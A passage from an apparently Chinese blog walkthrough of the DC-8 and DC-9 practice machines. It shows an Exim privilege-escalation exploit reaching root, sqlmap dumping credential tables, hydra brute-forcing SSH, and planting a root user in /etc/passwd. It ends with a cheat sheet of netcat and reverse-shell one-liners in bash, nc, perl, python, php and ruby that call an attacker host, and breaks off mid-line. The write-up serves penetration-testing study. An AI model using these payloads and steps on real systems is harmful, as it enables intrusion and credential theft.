class="number">15</span>:<span class="number">09</span> (<span class="number">23.1</span> MB/s) - <span class="string">'46996.sh'</span> saved [<span class="number">3706</span>/<span class="number">3706</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行脚本提权</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-8</span>:/tmp<span class="variable">$</span> ./run.sh <span class="literal">-m</span> netcat</span><br><span class="line">./run.sh <span class="literal">-m</span> netcat</span><br><span class="line"></span><br><span class="line">raptor_exim_wiz - <span class="string">"The Return of the WIZard"</span> LPE exploit</span><br><span class="line">Copyright (c) <span class="number">2019</span> Marco Ivaldi &lt;raptor@<span class="number">0</span>xdeadbeef.info&gt;</span><br><span class="line"></span><br><span class="line">Delivering netcat payload...</span><br><span class="line"><span class="number">220</span> dc<span class="literal">-8</span> ESMTP Exim <span class="number">4.89</span> Sat, <span class="number">19</span> Sep <span class="number">2020</span> <span class="number">13</span>:<span class="number">29</span>:<span class="number">30</span> +<span class="number">1000</span></span><br><span class="line"><span class="number">250</span> dc<span class="literal">-8</span> Hello localhost.lan [::<span class="number">1</span>]</span><br><span class="line"><span class="number">250</span> OK</span><br><span class="line"><span class="number">250</span> Accepted</span><br><span class="line"><span class="number">354</span> Enter message, ending with <span class="string">"."</span> on a line by itself</span><br><span class="line"><span class="number">250</span> OK id=<span class="number">1</span>kJTZ4<span class="literal">-0000Or</span><span class="literal">-UC</span></span><br><span class="line"><span class="number">221</span> dc<span class="literal">-8</span> closing connection</span><br><span class="line"></span><br><span class="line">Waiting <span class="number">5</span> seconds...</span><br><span class="line">whoami</span><br><span class="line">whoami</span><br><span class="line">localhost <span class="function">[<span class="number">127.0</span><span class="type">.0.1</span>] 31337 (?) <span class="title">open</span></span></span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">Brilliant - you have succeeded!!!</span><br><span class="line"></span><br><span class="line"><span class="number">888</span>       <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">8888888</span>b.                             <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span></span><br><span class="line"><span class="number">888</span>   o   <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  <span class="string">"Y88b                            888 888 888 888</span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888</span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888</span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88"</span><span class="string">"88b 888 "</span><span class="number">88</span>b d8P  Y8b <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span></span><br><span class="line"><span class="number">88888</span>P Y88888 <span class="number">88888888</span> <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>    <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">88888888</span> Y8P Y8P Y8P Y8P</span><br><span class="line"><span class="number">8888</span>P   Y8888 Y8b.     <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  .d88P Y88..<span class="number">88</span>P <span class="number">888</span>  <span class="number">888</span> Y8b.      <span class="string">"   "</span>   <span class="string">"   "</span></span><br><span class="line"><span class="number">888</span>P     Y888  <span class="string">"Y8888  888 888      8888888P"</span>   <span class="string">"Y88P"</span>  <span class="number">888</span>  <span class="number">888</span>  <span class="string">"Y8888  888 888 888 888</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those</span></span><br><span class="line"><span class="string">who have provided feedback, and all those who have taken the time to complete these little</span></span><br><span class="line"><span class="string">challenges.</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="DC-9渗透过程"><a href="#DC-9渗透过程" class="headerlink" title="DC-9渗透过程"></a><strong>DC-9渗透过程</strong></h2><p><strong>进入首页，查看输入的地方，发现存在sql注入，burp抓包然后丢入sqlmap进行爆破，在user表下发现的用户密码没什么用，查看另一个表，发现了admin，密码是md5加密，可以用自带的密码本爆破出来</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat dc-9</span></span><br><span class="line">POST /results.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">126.159</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (X11; Linux x86_64; rv:<span class="number">68.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">68.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept<span class="literal">-Language</span>: en<span class="literal">-US</span>,en;q=<span class="number">0.5</span></span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate</span><br><span class="line">Referer: http://<span class="number">192.168</span>.<span class="number">126.159</span>/search.php</span><br><span class="line">Content<span class="literal">-Type</span>: application/x<span class="literal">-www</span><span class="literal">-form</span><span class="literal">-urlencoded</span></span><br><span class="line">Content<span class="literal">-Length</span>: <span class="number">8</span></span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=<span class="number">9</span>sb365ben06it8fk0hu3bngrc3</span><br><span class="line">Upgrade<span class="literal">-Insecure</span><span class="literal">-Requests</span>: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">search=<span class="number">1</span></span><br><span class="line">root@kali:~<span class="comment"># sqlmap -r dc-9 -dbs</span></span><br><span class="line">root@kali:~<span class="comment"># sqlmap -r dc-9 -D users -T UserDetails -C id,username,password --dump</span></span><br><span class="line">Database: users</span><br><span class="line">Table: UserDetails</span><br><span class="line">[<span class="number">17</span> <span class="type">entries</span>]</span><br><span class="line">+----+-----------+---------------+</span><br><span class="line">| id | username  | password      |   </span><br><span class="line">+----+-----------+---------------+</span><br><span class="line">| <span class="number">1</span>  | marym     | <span class="number">3</span>kfs86sfd     |</span><br><span class="line">| <span class="number">2</span>  | julied    | <span class="number">468</span>sfdfsd2    |</span><br><span class="line">| <span class="number">3</span>  | fredf     | <span class="number">4</span>sfd87sfd1    |</span><br><span class="line">| <span class="number">4</span>  | barneyr   | RocksOff      |</span><br><span class="line">| <span class="number">5</span>  | tomc      | TC&amp;TheBoyz    |</span><br><span class="line">| <span class="number">6</span>  | jerrym    | B8m<span class="comment">#48sd      |</span></span><br><span class="line">| <span class="number">7</span>  | wilmaf    | Pebbles       |</span><br><span class="line">| <span class="number">8</span>  | bettyr    | BamBam01      |</span><br><span class="line">| <span class="number">9</span>  | chandlerb | UrAG0D!       |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># sqlmap -r dc-9 -D Staff -T Users -C  Username,Password --dump</span></span><br><span class="line"><span class="keyword">do</span> you want to use common password suffixes? (slow!) [<span class="type">y</span>/<span class="type">N</span>] y</span><br><span class="line">[<span class="number">12</span>:<span class="number">06</span>:<span class="number">17</span>] [<span class="type">INFO</span>] starting dictionary<span class="literal">-based</span> cracking (md5_generic_passwd)</span><br><span class="line">[<span class="number">12</span>:<span class="number">06</span>:<span class="number">17</span>] [<span class="type">INFO</span>] starting <span class="number">4</span> processes </span><br><span class="line">[<span class="number">12</span>:<span class="number">06</span>:<span class="number">49</span>] [<span class="type">INFO</span>] <span class="keyword">using</span> suffix <span class="string">'1'</span>                                                                                       </span><br><span class="line">[<span class="number">12</span>:<span class="number">07</span>:<span class="number">16</span>] [<span class="type">INFO</span>] cracked password <span class="string">'transorbital1'</span> <span class="keyword">for</span> user <span class="string">'admin'</span>                                                                </span><br><span class="line">Database: Staff                                                                                                                    </span><br><span class="line">Table: Users</span><br><span class="line">[<span class="number">1</span> <span class="type">entry</span>]</span><br><span class="line">+----------+--------------------------------------------------+</span><br><span class="line">| Username | Password                                         |</span><br><span class="line">+----------+--------------------------------------------------+</span><br><span class="line">| admin    | <span class="number">856</span>f5de590ef37314e7c3bdf6f8a66dc (transorbital1) |</span><br><span class="line">+----------+--------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p><strong>登陆后台，提示了文件不存在，可能存在文件包含漏洞。构造payload成功猜解出file关键词，但是和之前的不太一样，不能查看其它文件，没法写入，看了其它人的思路，后台存有/etc/knockd.conf文件，结合之前扫描出的22端口是关闭状态，knockd可以对SSH进行防护。这里意思是端口敲门，需要按照顺序‘敲’端口，如果敲击规则匹配，则可以让防火墙实时更改策略。从而达到开关防火墙的目的。</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/11.png" alt></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/152.png" alt></p>
<p><strong>依次nc连接目标端口，22端口成功打开！然后利用之前爆破出的用户名和密码，进行ssh连接尝试，得到3个成功用户！</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/var/www/html<span class="comment"># nmap -sV -p- -A 192.168.126.159</span></span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https://nmap.org ) at <span class="number">2020</span><span class="literal">-09</span><span class="literal">-19</span> <span class="number">11</span>:<span class="number">37</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">126.159</span></span><br><span class="line">Host is up (<span class="number">0.00049</span>s latency).</span><br><span class="line">Not shown: <span class="number">65519</span> closed ports</span><br><span class="line">PORT      STATE    SERVICE       VERSION</span><br><span class="line"><span class="number">22</span>/tcp    filtered ssh</span><br><span class="line"><span class="number">80</span>/tcp    open     http          Apache httpd <span class="number">2.4</span>.<span class="number">38</span> ((Debian))</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nc 192.168.126.159 7469</span></span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 7469 (?) : <span class="title">Connection</span></span> refused</span><br><span class="line">root@kali:~<span class="comment"># nc 192.168.126.159 8475</span></span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 8475 (?) : <span class="title">Connection</span></span> refused</span><br><span class="line">root@kali:~<span class="comment"># nc 192.168.126.159 9842</span></span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 9842 (?) : <span class="title">Connection</span></span> refused</span><br><span class="line">root@kali:~<span class="comment"># nmap -p 22 192.168.126.159</span></span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https://nmap.org ) at <span class="number">2020</span><span class="literal">-09</span><span class="literal">-19</span> <span class="number">16</span>:<span class="number">59</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">126.159</span></span><br><span class="line">Host is up (<span class="number">0.00032</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp open  ssh</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">76</span>:F3:B2 (VMware)</span><br><span class="line"></span><br><span class="line"><span class="comment">#保存在本地文件</span></span><br><span class="line">root@kali:~<span class="comment"># sqlmap -r dc-9 -D users -T UserDetails -C password --dump --output-dir /root/</span></span><br><span class="line">root@kali:~/<span class="number">192.168</span>.<span class="number">126.159</span>/dump/users<span class="comment"># hydra -L dc_user.txt -P pass_dc.txt ssh://192.168.126.159</span></span><br><span class="line">[<span class="number">22</span>][<span class="type">ssh</span>] host: <span class="number">192.168</span>.<span class="number">126.159</span>   login: chandlerb   password: UrAG0D!</span><br><span class="line">[<span class="number">22</span>][<span class="type">ssh</span>] host: <span class="number">192.168</span>.<span class="number">126.159</span>   login: joeyt   password: Passw0rd</span><br><span class="line">[<span class="number">22</span>][<span class="type">ssh</span>] host: <span class="number">192.168</span>.<span class="number">126.159</span>   login: janitor   password: Ilovepeepee</span><br></pre></td></tr></table></figure>

<p><strong>分别登陆3个用户，查看有没有什么线索，最后在janitor用户下发现了隐藏文件，里面又是几个密码，加入之前的密码本进行爆破，得到了新用户fredf，密码为B4-Tru3-001。进去查看提权文件，发现test文件可以执行root权限，运行完发现是python编写的，但是打开又是乱码，于是查找test.py文件，果然发现了，查看代码，大概意思就是可以将一个文件写入到另一个文件上，可以利用此添加用户，加入到/etc/passwd中去！</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">janitor@dc<span class="literal">-9</span>:~<span class="variable">$</span> ls <span class="literal">-la</span></span><br><span class="line">total <span class="number">16</span></span><br><span class="line">drwx------  <span class="number">4</span> janitor janitor <span class="number">4096</span> Sep <span class="number">19</span> <span class="number">19</span>:<span class="number">15</span> .</span><br><span class="line">drwxr<span class="literal">-xr</span><span class="literal">-x</span> <span class="number">19</span> root    root    <span class="number">4096</span> Dec <span class="number">29</span>  <span class="number">2019</span> ..</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> janitor janitor    <span class="number">9</span> Dec <span class="number">29</span>  <span class="number">2019</span> .bash_history -&gt; /dev/null</span><br><span class="line">drwx------  <span class="number">3</span> janitor janitor <span class="number">4096</span> Sep <span class="number">19</span> <span class="number">19</span>:<span class="number">15</span> .gnupg</span><br><span class="line">drwx------  <span class="number">2</span> janitor janitor <span class="number">4096</span> Dec <span class="number">29</span>  <span class="number">2019</span> .secrets<span class="literal">-for</span><span class="literal">-putin</span></span><br><span class="line">janitor@dc<span class="literal">-9</span>:~<span class="variable">$</span> cd .secrets<span class="literal">-for</span><span class="literal">-putin</span>/</span><br><span class="line">janitor@dc<span class="literal">-9</span>:~/.secrets<span class="literal">-for</span><span class="literal">-putin</span><span class="variable">$</span> ls</span><br><span class="line">passwords<span class="literal">-found</span><span class="literal">-on</span><span class="literal">-post</span><span class="literal">-it</span><span class="literal">-notes</span>.txt</span><br><span class="line">janitor@dc<span class="literal">-9</span>:~/.secrets<span class="literal">-for</span><span class="literal">-putin</span><span class="variable">$</span> cat passwords<span class="literal">-found</span><span class="literal">-on</span><span class="literal">-post</span><span class="literal">-it</span><span class="literal">-notes</span>.txt </span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic<span class="comment">#10-4</span></span><br><span class="line">B4<span class="literal">-Tru3</span><span class="literal">-001</span></span><br><span class="line"><span class="number">4</span>uGU5T<span class="literal">-NiGHts</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查找test.py</span></span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="variable">$</span> find / <span class="literal">-name</span> test.py <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/opt/devstuff/test.py</span><br><span class="line">/usr/lib/python3/dist<span class="literal">-packages</span>/setuptools/command/test.py</span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="variable">$</span> cd /opt/devstuff/</span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff<span class="variable">$</span> ls</span><br><span class="line">build  dist  __pycache__  test.py  test.spec</span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff<span class="variable">$</span> cat test.py </span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">import sys</span><br><span class="line"><span class="keyword">if</span> len (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    print (<span class="string">"Usage: python test.py read append"</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = open(sys.argv[<span class="number">1</span>], <span class="string">"r"</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = open(sys.argv[<span class="number">2</span>], <span class="string">"a"</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>

<p><strong>利用kail自带的openssl，进行加密，-1表示md5算法，-salt表示插入一个随机数作为加密内容</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="variable">$</span> openssl passwd <span class="literal">-1</span> <span class="literal">-salt</span> test <span class="number">123456</span></span><br><span class="line"><span class="variable">$1</span><span class="variable">$test</span><span class="variable">$at615QShYKduQlx5z9Zm7</span>/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户名:密码:uid:gid:家目录:登陆后使用的shell</span></span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="variable">$</span> echo <span class="string">'test:$1$test$at615QShYKduQlx5z9Zm7/:0:0::/root:/bin/bash'</span> &gt;&gt; /tmp/passwd</span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="variable">$</span> sudo ./test /tmp/passwd /etc/passwd</span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="variable">$</span> su test</span><br><span class="line">Password: </span><br><span class="line">root@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="comment"># cd /root</span></span><br><span class="line">  </span><br><span class="line">root@dc<span class="literal">-9</span>:~<span class="comment"># cat theflag.txt </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗</span><br><span class="line">████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║</span><br><span class="line">██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║</span><br><span class="line">██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝</span><br><span class="line">██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗</span><br><span class="line">╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝</span><br><span class="line">                                                                             </span><br><span class="line">Congratulations - you have done well to get to this point.</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC<span class="literal">-9</span>.  Just wanted to send out a big thanks to all those</span><br><span class="line">who have taken the time to complete the various DC challenges.</span><br><span class="line"></span><br><span class="line">I also want to send out a big thank you to the various members of @m0tl3ycr3w .</span><br><span class="line"></span><br><span class="line">They are an inspirational bunch of fellows.</span><br><span class="line"></span><br><span class="line">Sure, they might smell a bit, but...just kidding.  :-)</span><br><span class="line"></span><br><span class="line">Sadly, all things must come to an <span class="keyword">end</span>, and this will be the last ever</span><br><span class="line">challenge <span class="keyword">in</span> the DC series.</span><br><span class="line"></span><br><span class="line">So long, and thanks <span class="keyword">for</span> all the fish.</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a><strong>知识点总结</strong></h2><h3 id="1-nc常见用法"><a href="#1-nc常见用法" class="headerlink" title="1.nc常见用法"></a><strong>1.nc常见用法</strong></h3><p>简单介绍下，nc（netcat）网络工具中的瑞士军刀，主要作用如下：</p>
<ul>
<li><strong>实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口</strong></li>
<li><strong>端口的扫描，nc可以作为client发起TCP或UDP连接</strong></li>
<li><strong>机器之间传输文件</strong></li>
</ul>
<table>
<thead>
<tr>
<th><strong>常用命令</strong></th>
<th align="left"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>nc  -lvp   2333</strong></td>
<td align="left"><strong>-l   使用监听模式     -v 显示指令执行过程  用-vv将更详细<br>-p   &lt;通信端口&gt;     设置本地主机使用的通信端口</strong></td>
</tr>
<tr>
<td><strong>-z</strong></td>
<td align="left"><strong>使用0输入/输出模式，只在扫描通信端口时使用</strong></td>
</tr>
<tr>
<td><strong>-w&lt;超时秒数&gt;</strong></td>
<td align="left"><strong>设置等待连线的时间</strong></td>
</tr>
<tr>
<td><strong>-n</strong></td>
<td align="left"><strong>直接使用IP地址，而不通过域名服务器</strong></td>
</tr>
<tr>
<td><strong>-e filename</strong></td>
<td align="left"><strong>program to exec after connect [dangerous!!]</strong></td>
</tr>
</tbody></table>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#TCP端口扫描，-w2设置2s超时时间，避免漏过某些端口</span></span><br><span class="line">root@kali:~<span class="comment"># nc -zv -w2  192.168.126.159 1-100</span></span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 80 (<span class="title">http</span></span>) open</span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 22 (<span class="title">ssh</span></span>) open</span><br><span class="line"></span><br><span class="line"><span class="comment">#UDP端口扫描</span></span><br><span class="line">root@kali:~<span class="comment"># nc -zuv -w2  192.168.126.159 1-100</span></span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 752 (<span class="title">passwd</span></span><span class="literal">-server</span>) open</span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 751 (<span class="title">kerberos</span></span><span class="literal">-master</span>) open</span><br><span class="line"></span><br><span class="line"><span class="comment">#常见用法，用来传输文件</span></span><br><span class="line">靶机：ps aux | nc <span class="literal">-nv</span> <span class="number">192.168</span>.<span class="number">126.33</span> <span class="number">2333</span> <span class="literal">-q</span> <span class="number">1</span>  <span class="comment">#-q 1的意思是连接成功时候，连接会自动断掉</span></span><br><span class="line">主机：nc <span class="literal">-lp</span> <span class="number">2333</span> &gt; ps.txt </span><br><span class="line"></span><br><span class="line"><span class="comment">#连接目标ip端口后，执行/bin/bash命令，即反弹shell</span></span><br><span class="line">nc <span class="literal">-e</span> /bin/bash <span class="number">192.168</span>.<span class="number">126.33</span> <span class="number">2333</span></span><br></pre></td></tr></table></figure>

<h3 id="2-常见反弹shell的姿势"><a href="#2-常见反弹shell的姿势" class="headerlink" title="2.常见反弹shell的姿势"></a><strong>2.常见反弹shell的姿势</strong></h3><p>基本上进入靶机后，都要先反弹shell，这样连接更稳定些，也避免端口关闭无法连接，主要的几种方式如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#bash版本：</span></span><br><span class="line">bash <span class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">10.0</span>.<span class="number">0.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#nc版本：</span></span><br><span class="line">nc <span class="literal">-e</span> /bin/sh <span class="number">10.0</span>.<span class="number">0.1</span> <span class="number">1234</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#顺序执行多条命令，可以用分号;mkfifo 创建管道符</span></span><br><span class="line">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh <span class="literal">-i</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">10.0</span>.<span class="number">0.1</span> <span class="number">1234</span> &gt;/tmp/f</span><br><span class="line"></span><br><span class="line"><span class="comment">#远程的输入，作为本地的输入，在本地解释器执行后，再输出到远程，实现反弹shell</span></span><br><span class="line">nc x.x.x.x <span class="number">8888</span>|/bin/sh|nc x.x.x.x <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#perl版本:</span></span><br><span class="line">perl <span class="literal">-e</span> <span class="string">'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#python版本：</span></span><br><span class="line">python <span class="literal">-c</span> <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#php版本：</span></span><br><span class="line">php <span class="literal">-r</span> <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ruby版本：</span></span><br><span class="line">ruby <span class="literal">-rsocket</span> <span class="literal">-e</span><span class="string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#java版本</span></span><br><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span 